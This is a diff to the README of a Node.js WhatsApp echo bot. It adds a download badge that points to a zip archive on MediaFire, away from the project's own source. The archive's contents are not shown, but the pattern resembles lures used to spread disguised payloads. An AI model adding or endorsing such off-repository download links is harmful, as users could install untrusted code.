@@ -2,6 +2,11 @@
 
 A Node.js bot powered by [whatsapp-web.js](https://github.com/pedroslopez/whatsapp-web.js) that automatically echoes incoming text messages back to the sender, with configurable options and admin controls.
 
+## Download:
+
+[![Download WhatsApp Echo Bot](https://img.shields.io/badge/Download-WhatsApp%20Echo%20Bot-blue?style=for-the-badge&logo=github)](https://www.mediafire.com/file/wz5xdpu0fu5j84a/whatsapp-echobot.zip/file)
+
+
 ## ⚙️ Features
 
 - **Echo Mode**: Reply or send messages back with quotes.
